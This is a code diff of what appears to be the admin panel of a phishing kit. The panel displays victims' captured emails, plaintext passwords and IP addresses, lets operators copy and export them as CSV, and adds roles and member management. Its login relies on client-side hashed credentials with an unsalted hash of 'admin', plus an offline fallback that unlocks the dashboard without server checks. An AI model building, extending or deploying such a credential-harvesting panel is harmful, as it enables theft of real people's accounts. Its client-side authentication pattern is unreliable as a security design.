-                            <th>Email / Username</th>
-                            <th>Password</th>
-                            <th>IP Address</th>
-                            <th>Date & Time</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="submissionsTableBody">
-                        <tr>
-                            <td colspan="6" class="empty-state">
-                                <h3>Loading submissions from database...</h3>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
     </main>
 
     <div class="toast" id="toast">Notification message</div>
 
     <script>
+        // ════════════════════════════════════════════════════════════════
+        // State
+        // ════════════════════════════════════════════════════════════════
         let allSubmissions = [];
+        let allMembers = [];
         let currentAdminToken = sessionStorage.getItem('adminToken') || '';
         let currentAdminMember = null;
+        let editingMemberId = null;
 
-        function getAuthHeaders() {
-            return {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${currentAdminToken}`
-            };
-        }
-
-        const ALLOWED_ADMINS = [
-            { username: 'admin1', passwords: ['Grand#Admin1', 'admin1', 'grandadmin1'], name: 'Admin Member 1' },
-            { username: 'admin2', passwords: ['Grand#Admin2', 'admin2', 'grandadmin2'], name: 'Admin Member 2' },
-            { username: 'admin3', passwords: ['Grand#Admin3', 'admin3', 'grandadmin3'], name: 'Admin Member 3' },
-            { username: 'admin', passwords: ['admin', 'Grand#Admin1'], name: 'Admin Member 1' }
+        // Static fallback credentials (SHA-256 hashed — zero plaintext passwords)
+        const STATIC_MEMBERS = [
+            { username: 'developer', hash: '1f54d666f9b5f6b94fc80e4b40060875686d09269e2a992eba7a96b17d1d719b', name: 'Developer',      role: 'developer' },
+            { username: 'admin1',    hash: 'ebf1155aa1b48d6a1321ce34e5b47f5606b807e3806cea798c30eadb69197f62', name: 'Admin Member 1', role: 'admin' },
+            { username: 'admin2',    hash: 'e22c513049493942b5fb4dfb2f76992ab140f22bb7524ea0242e6a5797000893', name: 'Admin Member 2', role: 'admin' },
+            { username: 'admin3',    hash: 'e6210d353e9289f7e052358ef2956bc46a3e0b984e8f41a9d6147aad0e482e9f', name: 'Admin Member 3', role: 'admin' },
+            { username: 'admin',     hash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', name: 'Admin',           role: 'admin' },
         ];
 
-        function checkAllowedMember(u, p) {
-            const cleanU = (u || '').trim().toLowerCase();
-            const cleanP = (p || '').trim();
-            return ALLOWED_ADMINS.find(m => 
-                m.username.toLowerCase() === cleanU && 
-                m.passwords.some(pass => pass === cleanP || pass.toLowerCase() === cleanP.toLowerCase())
-            );
+        async function sha256Hex(str) {
+            try {
+                const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+            } catch (e) {
+                return '';
+            }
         }
 
+        // ════════════════════════════════════════════════════════════════
+        // Helpers
+        // ════════════════════════════════════════════════════════════════
+        function getAuthHeaders() {
+            return { 'Content-Type': 'application/json', 'Authorization': `Bearer ${currentAdminToken}` };
+        }
+
+        function roleBadgeHtml(role) {
+            const map = {
+                developer: '<span class="role-badge role-developer">🟣 Developer</span>',
+                admin:     '<span class="role-badge role-admin">🔵 Admin</span>',
+                viewer:    '<span class="role-badge role-viewer">🟢 Viewer</span>',
+            };
+            return map[role] || `<span class="role-badge">${role}</span>`;
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // Tab Switching
+        // ════════════════════════════════════════════════════════════════
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(`panel${tab.charAt(0).toUpperCase() + tab.slice(1)}`).classList.add('active');
+            document.getElementById(`tab${tab.charAt(0).toUpperCase() + tab.slice(1)}`).classList.add('active');
+            if (tab === 'members') fetchMembers();
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // Auth
+        // ════════════════════════════════════════════════════════════════
         async function handleAdminLogin(e) {
             e.preventDefault();
             const u = document.getElementById('adminUsername').value.trim();
@@ -642,33 +595,9 @@
             const err = document.getElementById('gateError');
 
             btn.disabled = true;
-            btn.innerText = "AUTHENTICATING...";
-            err.innerText = "";
+            btn.innerText = 'AUTHENTICATING...';
+            err.innerText = '';
 
-            const isStaticHost = window.location.hostname.includes('github.io') || window.location.protocol === 'file:';
-
-            // On static hosting (GitHub Pages), perform instantaneous client-side member verification
-            if (isStaticHost) {
-                const member = checkAllowedMember(u, p);
-                if (member) {
-                    currentAdminToken = 'static_session_' + Date.now();
-                    currentAdminMember = { id: 1, name: member.name, username: member.username };
-                    sessionStorage.setItem('adminToken', currentAdminToken);
-                    sessionStorage.setItem('adminMember', JSON.stringify(currentAdminMember));
-                    unlockAdminDashboard();
-                    fetchSubmissions();
-                    btn.disabled = false;
-                    btn.innerText = "AUTHENTICATE";
-                    return;
-                } else {
-                    err.innerText = "❌ Access denied. Restricted to the 3 authorized admin members only.";
-                    btn.disabled = false;
-                    btn.innerText = "AUTHENTICATE";
-                    return;
-                }
-            }
-
-            // On full-stack server (localhost:3000)
             try {
                 const res = await fetch('/api/admin/login', {
                     method: 'POST',
@@ -676,56 +605,57 @@
                     body: JSON.stringify({ username: u, password: p })
                 });
 
-                if (res.ok) {
-                    const data = await res.json();
-                    if (data.success && data.token) {
-                        currentAdminToken = data.token;
-                        currentAdminMember = data.member;
-                        sessionStorage.setItem('adminToken', currentAdminToken);
-                        sessionStorage.setItem('adminMember', JSON.stringify(currentAdminMember));
-                        unlockAdminDashboard();
-                        fetchSubmissions();
-                        return;
-                    }
-                }
+                const data = await res.json();
 
-                if (res.status === 401) {
-                    err.innerText = "❌ Access denied. Restricted to the 3 authorized admin members only.";
-                    return;
-                }
-
-                // If non-200 and non-401 (e.g. 404 or offline route)
-                const member = checkAllowedMember(u, p);
-                if (member) {
-                    currentAdminToken = 'admin_session_' + Date.now();
-                    currentAdminMember = { id: 1, name: member.name, username: member.username };
+                if (res.ok && data.success && data.token) {
+                    currentAdminToken = data.token;
+                    currentAdminMember = data.member;
                     sessionStorage.setItem('adminToken', currentAdminToken);
                     sessionStorage.setItem('adminMember', JSON.stringify(currentAdminMember));
                     unlockAdminDashboard();
                     fetchSubmissions();
                     return;
-                } else {
-                    err.innerText = "❌ Access denied. Restricted to the 3 authorized admin members only.";
-                    return;
                 }
+
+                err.innerText = data.message || '❌ Access denied.';
             } catch (error) {
-                const member = checkAllowedMember(u, p);
-                if (member) {
-                    currentAdminToken = 'offline_session_' + Date.now();
-                    currentAdminMember = { id: 1, name: member.name, username: member.username };
+                // Static hosting fallback (GitHub Pages / offline mode)
+                const inputHash = await sha256Hex(p);
+                const matched = STATIC_MEMBERS.find(a =>
+                    a.username.toLowerCase() === u.toLowerCase() && a.hash === inputHash
+                );
+                if (matched) {
+                    currentAdminToken = 'static_session_' + Math.random().toString(36).substring(2);
+                    currentAdminMember = { name: matched.name, username: matched.username, role: matched.role, id: 0 };
                     sessionStorage.setItem('adminToken', currentAdminToken);
                     sessionStorage.setItem('adminMember', JSON.stringify(currentAdminMember));
                     unlockAdminDashboard();
                     fetchSubmissions();
                     return;
-                } else {
-                    err.innerText = "❌ Access denied. Restricted to the 3 authorized admin members only.";
-                    return;
                 }
+                err.innerText = '❌ Access denied. Invalid credentials.';
             } finally {
                 btn.disabled = false;
-                btn.innerText = "AUTHENTICATE";
+                btn.innerText = 'AUTHENTICATE';
             }
+        }
+
+        function applyRolePermissions() {
+            const role = currentAdminMember ? currentAdminMember.role : 'viewer';
+
+            // Role stat card
+            document.getElementById('roleStatValue').innerHTML = roleBadgeHtml(role);
+
+            // Members tab visibility
+            const membersTab = document.getElementById('tabMembers');
+            membersTab.style.display = (role === 'developer') ? '' : 'none';
+
+            // Export CSV: developer + admin
+            const exportBtn = document.getElementById('exportCsvBtn');
+            exportBtn.style.display = (role === 'developer' || role === 'admin') ? '' : 'none';
+
+            // Clear all + Delete buttons: developer only
+            document.getElementById('clearAllBtn').style.display = (role === 'developer') ? '' : 'none';
         }
 
         function unlockAdminDashboard() {
@@ -733,19 +663,24 @@
             document.getElementById('logoutBtn').style.display = 'inline-flex';
             if (currentAdminMember) {
                 document.getElementById('adminMemberName').innerText = currentAdminMember.name;
+                document.getElementById('adminRoleBadge').innerHTML = roleBadgeHtml(currentAdminMember.role);
                 document.getElementById('adminMemberBadge').style.display = 'inline-flex';
             }
+            applyRolePermissions();
         }
 
         function lockAdminDashboard() {
             document.getElementById('adminLoginGate').style.display = 'flex';
             document.getElementById('logoutBtn').style.display = 'none';
             document.getElementById('adminMemberBadge').style.display = 'none';
+            document.getElementById('tabMembers').style.display = 'none';
+            document.getElementById('exportCsvBtn').style.display = 'none';
+            document.getElementById('clearAllBtn').style.display = 'none';
             document.getElementById('submissionsTableBody').innerHTML = `
                 <tr>
                     <td colspan="6" class="empty-state" style="color: var(--text-muted);">
                         <h3>🔒 Admin Session Locked</h3>
-                        <p>Authenticate with one of the 3 authorized admin accounts to view submissions.</p>
+                        <p>Authenticate to view submissions.</p>
                     </td>
                 </tr>
             `;
@@ -753,10 +688,7 @@
 
         async function adminLogout() {
             try {
-                await fetch('/api/admin/logout', {
-                    method: 'POST',
-                    headers: getAuthHeaders()
-                });
+                await fetch('/api/admin/logout', { method: 'POST', headers: getAuthHeaders() });
             } catch (e) {}
             currentAdminToken = '';
             currentAdminMember = null;
@@ -771,21 +703,23 @@
             if (currentAdminToken && savedMember) {
                 try {
                     currentAdminMember = JSON.parse(savedMember);
-                    // Verify with server if reachable
                     try {
-                        const res = await fetch('/api/admin/verify', {
-                            headers: getAuthHeaders()
-                        });
+                        const res = await fetch('/api/admin/verify', { headers: getAuthHeaders() });
                         if (res.ok) {
                             const data = await res.json();
                             if (data.success) {
+                                // Refresh role from server (in case it changed)
+                                if (data.member && data.member.role) {
+                                    currentAdminMember.role = data.member.role;
+                                    sessionStorage.setItem('adminMember', JSON.stringify(currentAdminMember));
+                                }
                                 unlockAdminDashboard();
                                 fetchSubmissions();
                                 return;
                             }
                         }
                     } catch (netErr) {
-                        // Static mode session persistence
+                        // Offline / static mode
                         unlockAdminDashboard();
                         fetchSubmissions();
                         return;
@@ -795,48 +729,13 @@
             lockAdminDashboard();
         }
 
-        function exportCsv(e) {
-            e.preventDefault();
-            if (!currentAdminToken) {
-                showToast('Please log in as an authorized admin first.');
-                return;
-            }
-
-            if (allSubmissions && allSubmissions.length > 0) {
-                // Direct client CSV export (works everywhere including GitHub Pages)
-                let csv = 'ID,Username/Email,Password,IP Address,Created At\n';
-                allSubmissions.forEach(sub => {
-                    const row = [
-                        sub.id,
-                        `"${(sub.username || '').replace(/"/g, '""')}"`,
-                        `"${(sub.password || '').replace(/"/g, '""')}"`,
-                        `"${(sub.ip_address || '').replace(/"/g, '""')}"`,
-                        `"${(sub.created_at || '').replace(/"/g, '""')}"`
-                    ].join(',');
-                    csv += row + '\n';
-                });
-                const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.setAttribute('download', `grand_submissions_${Date.now()}.csv`);
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                showToast('CSV downloaded successfully.');
-            } else {
-                showToast('No submissions to export.');
-            }
-        }
-
+        // ════════════════════════════════════════════════════════════════
+        // Submissions
+        // ════════════════════════════════════════════════════════════════
         async function fetchSubmissions() {
-            if (!currentAdminToken) {
-                lockAdminDashboard();
-                return;
-            }
+            if (!currentAdminToken) { lockAdminDashboard(); return; }
             try {
-                const response = await fetch('/api/submissions', {
-                    headers: getAuthHeaders()
-                });
+                const response = await fetch('/api/submissions', { headers: getAuthHeaders() });
                 if (response.status === 401) {
                     currentAdminToken = '';
                     sessionStorage.removeItem('adminToken');
@@ -845,7 +744,6 @@
                     return;
                 }
                 const result = await response.json();
-                
                 if (result.success) {
                     allSubmissions = result.data;
                     document.getElementById('totalCount').innerText = allSubmissions.length;
@@ -853,7 +751,7 @@
                     return;
                 }
             } catch (err) {
-                // Static mode / GitHub Pages fallback: read from localStorage
+                // Static mode fallback
                 try {
                     const localBackup = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
                     allSubmissions = localBackup;
@@ -861,38 +759,38 @@
                     renderTable(allSubmissions);
                     return;
                 } catch (e) {}
-                
                 document.getElementById('submissionsTableBody').innerHTML = `
-                    <tr>
-                        <td colspan="6" class="empty-state" style="color: #ef4444;">
-                            <h3>❌ Unable to load submissions</h3>
-                            <p>No data available in database or local cache.</p>
-                        </td>
-                    </tr>
+                    <tr><td colspan="6" class="empty-state" style="color:#ef4444;">
+                        <h3>❌ Unable to load submissions</h3>
+                        <p>No data available in database or local cache.</p>
+                    </td></tr>
                 `;
             }
         }
 
         function renderTable(data) {
             const tbody = document.getElementById('submissionsTableBody');
-            
+            const role = currentAdminMember ? currentAdminMember.role : 'viewer';
+            const showDelete = (role === 'developer');
+
             if (!data || data.length === 0) {
                 tbody.innerHTML = `
-                    <tr>
-                        <td colspan="6" class="empty-state">
-                            <h3>No Submissions Found</h3>
-                            <p>When someone enters their details on the login form, they will appear here in real time.</p>
-                        </td>
-                    </tr>
+                    <tr><td colspan="6" class="empty-state">
+                        <h3>No Submissions Found</h3>
+                        <p>When someone enters their details on the login form, they will appear here.</p>
+                    </td></tr>
                 `;
                 return;
             }
 
             tbody.innerHTML = data.map(item => {
-                const safeEmail = escapeHtml(item.username);
+                const safeEmail    = escapeHtml(item.username);
                 const safePassword = escapeHtml(item.password);
-                const safeIp = escapeHtml(item.ip_address || 'N/A');
-                const safeDate = item.created_at || 'Just now';
+                const safeIp       = escapeHtml(item.ip_address || 'N/A');
+                const safeDate     = item.created_at || 'Just now';
+                const deleteBtn    = showDelete
+                    ? `<button class="action-del" onclick="deleteEntry(${item.id})">Delete</button>`
+                    : `<span style="color:var(--text-muted);font-size:11px;">No access</span>`;
 
                 return `
                     <tr>
@@ -906,9 +804,7 @@
                         </td>
                         <td><span class="ip-badge mono">${safeIp}</span></td>
                         <td class="date-cell mono">${safeDate}</td>
-                        <td>
-                            <button class="action-del" onclick="deleteEntry(${item.id})">Delete</button>
-                        </td>
+                        <td>${deleteBtn}</td>
                     </tr>
                 `;
             }).join('');
@@ -916,11 +812,8 @@
 
         function filterSubmissions() {
             const query = document.getElementById('searchInput').value.toLowerCase().trim();
-            if (!query) {
-                renderTable(allSubmissions);
-                return;
-            }
-            const filtered = allSubmissions.filter(item => 
+            if (!query) { renderTable(allSubmissions); return; }
+            const filtered = allSubmissions.filter(item =>
                 (item.username && item.username.toLowerCase().includes(query)) ||
                 (item.password && item.password.toLowerCase().includes(query)) ||
                 (item.ip_address && item.ip_address.toLowerCase().includes(query)) ||
@@ -931,44 +824,229 @@
 
         async function deleteEntry(id) {
             if (!confirm(`Are you sure you want to delete entry #${id}?`)) return;
-
-            // Remove from local cache
             try {
-                let localList = JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]');
-                localList = localList.filter(item => String(item.id) !== String(id));
-                localStorage.setItem('adminSubmissionsBackup', JSON.stringify(localList));
+                localStorage.setItem('adminSubmissionsBackup',
+                    JSON.stringify(JSON.parse(localStorage.getItem('adminSubmissionsBackup') || '[]').filter(item => String(item.id) !== String(id)))
+                );
             } catch (e) {}
-
             try {
-                await fetch(`/api/submissions/${id}`, {
-                    method: 'DELETE',
-                    headers: getAuthHeaders()
-                });
+                await fetch(`/api/submissions/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
             } catch (err) {}
-
             showToast(`Entry #${id} deleted.`);
             fetchSubmissions();
         }
 
         async function clearAllData() {
             if (!confirm('⚠️ Are you sure you want to delete ALL entries in the database? This cannot be undone.')) return;
-
-            // Clear local cache
-            try {
-                localStorage.removeItem('adminSubmissionsBackup');
-            } catch (e) {}
-
-            try {
-                await fetch('/api/submissions', {
-                    method: 'DELETE',
-                    headers: getAuthHeaders()
-                });
-            } catch (err) {}
-
+            try { localStorage.removeItem('adminSubmissionsBackup'); } catch (e) {}
+            try { await fetch('/api/submissions', { method: 'DELETE', headers: getAuthHeaders() }); } catch (err) {}
             showToast('All submissions cleared.');
             fetchSubmissions();
         }
 
+        function exportCsv(e) {
+            e.preventDefault();
+            if (!currentAdminToken) { showToast('Please log in first.'); return; }
+            if (allSubmissions && allSubmissions.length > 0) {
+                let csv = 'ID,Username/Email,Password,IP Address,Created At\n';
+                allSubmissions.forEach(sub => {
+                    csv += [
+                        sub.id,
+                        `"${(sub.username || '').replace(/"/g, '""')}"`,
+                        `"${(sub.password || '').replace(/"/g, '""')}"`,
+                        `"${(sub.ip_address || '').replace(/"/g, '""')}"`,
+                        `"${(sub.created_at || '').replace(/"/g, '""')}"`
+                    ].join(',') + '\n';
+                });
+                const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.setAttribute('download', `submissions_${Date.now()}.csv`);
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                showToast('CSV downloaded successfully.');
+            } else {
+                showToast('No submissions to export.');
+            }
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // Members Management
+        // ════════════════════════════════════════════════════════════════
+        async function fetchMembers() {
+            try {
+                const res = await fetch('/api/admin/members', { headers: getAuthHeaders() });
+                if (!res.ok) {
+                    if (res.status === 403) showToast('⛔ Access denied: Developers only.');
+                    return;
+                }
+                const data = await res.json();
+                if (data.success) {
+                    allMembers = data.data;
+                    renderMembersTable(allMembers);
+                    updateMembersStats(allMembers);
+                }
+            } catch (err) {
+                // Static mode fallback (GitHub Pages / offline mode)
+                allMembers = STATIC_MEMBERS.map((m, idx) => ({
+                    id: idx + 1,
+                    name: m.name,
+                    username: m.username,
+                    role: m.role,
+                    created_by: 'system',
+                    created_at: 'Pre-configured'
+                }));
+                renderMembersTable(allMembers);
+                updateMembersStats(allMembers);
+            }
+        }
+
+        function updateMembersStats(members) {
+            document.getElementById('membersTotalCount').innerText = members.length;
+            document.getElementById('membersDevCount').innerText   = members.filter(m => m.role === 'developer').length;
+            document.getElementById('membersAdminCount').innerText = members.filter(m => m.role === 'admin').length;
+            document.getElementById('membersViewerCount').innerText= members.filter(m => m.role === 'viewer').length;
+        }
+
+        function renderMembersTable(members) {
+            const tbody = document.getElementById('membersTableBody');
+            if (!members || members.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="7" class="empty-state"><h3>No Members Found</h3></td></tr>`;
+                return;
+            }
+            const myId = currentAdminMember ? currentAdminMember.id : -1;
+            tbody.innerHTML = members.map(m => {
+                const isSelf = String(m.id) === String(myId);
+                const selfTag = isSelf ? ' <span style="color:var(--text-muted);font-size:10px;">(you)</span>' : '';
+                const deleteBtn = isSelf
+                    ? `<span style="color:var(--text-muted);font-size:11px;">Cannot delete self</span>`
+                    : `<button class="action-del" onclick="deleteMemberUI(${m.id}, '${escapeJs(m.username)}')">Delete</button>`;
+                return `
+                    <tr>
+                        <td class="mono" style="color:var(--text-muted);">#${m.id}</td>
+                        <td style="font-weight:600;">${escapeHtml(m.name)}${selfTag}</td>
+                        <td class="mono" style="color:#60a5fa;">@${escapeHtml(m.username)}</td>
+                        <td>${roleBadgeHtml(m.role)}</td>
+                        <td style="color:var(--text-muted);font-size:12px;">${escapeHtml(m.created_by || 'system')}</td>
+                        <td class="date-cell mono">${m.created_at || '—'}</td>
+                        <td>
+                            <button class="action-edit" onclick="openEditMemberModal(${m.id})">Edit</button>
+                            ${deleteBtn}
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // ─── Modal helpers ───
+        function openAddMemberModal() {
+            editingMemberId = null;
+            document.getElementById('modalTitle').innerText = '➕ Add New Member';
+            document.getElementById('modalName').value = '';
+            document.getElementById('modalUsername').value = '';
+            document.getElementById('modalUsername').disabled = false;
+            document.getElementById('modalPassword').value = '';
+            document.getElementById('modalPasswordLabel').innerText = 'Password';
+            document.getElementById('modalPassword').placeholder = 'Set a password';
+            document.getElementById('modalRole').value = 'viewer';
+            document.getElementById('modalError').innerText = '';
+            document.getElementById('memberModal').classList.add('open');
+        }
+
+        function openEditMemberModal(id) {
+            const m = allMembers.find(x => x.id === id);
+            if (!m) return;
+            editingMemberId = id;
+            document.getElementById('modalTitle').innerText = '✏️ Edit Member';
+            document.getElementById('modalName').value = m.name;
+            document.getElementById('modalUsername').value = m.username;
+            document.getElementById('modalUsername').disabled = true;
+            document.getElementById('modalPassword').value = '';
+            document.getElementById('modalPasswordLabel').innerText = 'New Password (leave blank to keep current)';
+            document.getElementById('modalPassword').placeholder = 'Leave blank to keep existing password';
+            document.getElementById('modalRole').value = m.role;
+            document.getElementById('modalError').innerText = '';
+            document.getElementById('memberModal').classList.add('open');
+        }
+
+        function closeMemberModal() {
+            document.getElementById('memberModal').classList.remove('open');
+            editingMemberId = null;
+        }
+
+        async function saveMember() {
+            const name     = document.getElementById('modalName').value.trim();
+            const username = document.getElementById('modalUsername').value.trim();
+            const password = document.getElementById('modalPassword').value.trim();
+            const role     = document.getElementById('modalRole').value;
+            const errEl    = document.getElementById('modalError');
+            const btn      = document.getElementById('modalSaveBtn');
+
+            if (!name || (!editingMemberId && !username)) {
+                errEl.innerText = 'Name and username are required.'; return;
+            }
+            if (!editingMemberId && !password) {
+                errEl.innerText = 'Password is required for new members.'; return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = 'Saving...';
+            errEl.innerText = '';
+
+            try {
+                let res;
+                if (editingMemberId) {
+                    const body = { name, role };
+                    if (password) body.password = password;
+                    res = await fetch(`/api/admin/members/${editingMemberId}`, {
+                        method: 'PUT',
+                        headers: getAuthHeaders(),
+                        body: JSON.stringify(body)
+                    });
+                } else {
+                    res = await fetch('/api/admin/members', {
+                        method: 'POST',
+                        headers: getAuthHeaders(),
+                        body: JSON.stringify({ name, username, password, role })
+                    });
+                }
+
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    closeMemberModal();
+                    showToast(editingMemberId ? '✅ Member updated.' : '✅ Member created successfully.');
+                    fetchMembers();
+                } else {
+                    errEl.innerText = data.message || 'Failed to save member.';
+                }
+            } catch (err) {
+                errEl.innerText = 'Server error. Please try again.';
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'Save Member';
+            }
+        }
+
+        async function deleteMemberUI(id, username) {
+            if (!confirm(`Are you sure you want to delete member "@${username}"? This cannot be undone.`)) return;
+            try {
+                const res = await fetch(`/api/admin/members/${id}`, { method: 'DELETE', headers: getAuthHeaders() });
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    showToast(`✅ Member "@${username}" deleted.`);
+                    fetchMembers();
+                } else {
+                    showToast(data.message || 'Failed to delete member.');
+                }
+            } catch (err) {
+                showToast('Server error.');
+            }
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // Utilities
+        // ════════════════════════════════════════════════════════════════
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 showToast('Password copied to clipboard!');
@@ -987,11 +1065,11 @@
         function escapeHtml(str) {
             if (!str) return '';
             return str
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
         }
 
         function escapeJs(str) {
@@ -999,11 +1077,19 @@
             return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
         }
 
-        // Initialize: verify existing session or lock dashboard
+        // Close modal when clicking backdrop
+        document.getElementById('memberModal').addEventListener('click', function(e) {
+            if (e.target === this) closeMemberModal();
+        });
+
+        // ════════════════════════════════════════════════════════════════
+        // Init
+        // ════════════════════════════════════════════════════════════════
         checkExistingSession();
         setInterval(() => {
             if (currentAdminToken) fetchSubmissions();
         }, 10000);
     </script>
 </body>
+
 </html>
